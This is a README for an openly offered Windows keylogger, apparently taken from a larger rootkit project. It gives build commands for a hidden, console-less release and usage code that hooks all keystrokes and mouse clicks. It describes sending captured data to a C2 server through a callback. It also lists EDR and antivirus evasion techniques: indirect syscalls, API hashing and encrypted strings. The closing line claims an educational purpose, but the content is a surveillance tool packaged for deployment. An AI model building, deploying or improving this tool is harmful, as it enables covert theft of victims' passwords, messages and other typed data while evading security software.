# Stealth Keylogger

A Windows keylogger that uses low-level hooks to capture keystrokes system-wide. 

## What it does

Captures every keystroke on a Windows system, including special characters and unicode. It tracks which window is active and logs everything to a file in the temp directory with a random name.

The hook works at the lowest level (WH_KEYBOARD_LL) so it catches everything before applications see it. Right-click or press Enter to flush the buffer immediately.

## Building

You need MinGW-w64 or any modern C++ compiler on Windows.

Debug version (shows console):
```
g++ -c dosyscall.S -o dosyscall.o
g++ -o keylogger_debug.exe main.cpp IndirectSyscalls.cpp APIHashing.cpp dosyscall.o -std=c++17 -Wall -Wextra -O2 -static
```

Release version (no console, runs hidden):
```
g++ -c dosyscall.S -o dosyscall.o
g++ -o keylogger.exe main.cpp IndirectSyscalls.cpp APIHashing.cpp dosyscall.o -std=c++17 -Wall -Wextra -O2 -static -mwindows
```

Or just use the PowerShell script:
```
.\build.ps1 -Mode Release
```

Or use Make:
```
make release
```

## How to use

The main.cpp file has a complete example. Basically:

```cpp
#include "Keylogger.h"

// Start capturing
Keylogger::Start(nullptr, true);

// Keep it running
MSG msg;
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}

// Clean stop
Keylogger::Stop();
```

If you want to send data to a C2 server instead of just logging to a file, pass a callback function:

```cpp
void SendToServer(const wstring& data) {
    // Your HTTP POST or whatever
}

Keylogger::Start(SendToServer, true);
```

## Technical details

- Uses SetWindowsHookExW with WH_KEYBOARD_LL for keyboard
- WH_MOUSE_LL hook detects right-clicks (triggers immediate send)
- ToUnicodeEx handles unicode properly (accents, symbols, AltGr combos)
- Thread-safe buffer with mutex
- Tracks active window with GetForegroundWindow
- No admin rights needed

### Evasion techniques

- **Indirect Syscalls**: Direct NT syscall invocation via clean NTDLL (bypass EDR hooks)
- **API Hashing**: djb2 hash algorithm for runtime API resolution (evades IAT analysis)
- **String Obfuscation**: AES-128 CTR compile-time encryption with FNV-1a key derivation

## Contact

Questions or bugs? Open an issue or email 28zaakypro@proton.me

## Related

This keylogger is extracted from the full rootkit project:
https://github.com/28Zaaky/Usermode-Rootkit

---

Made for educational and authorized security research purposes.
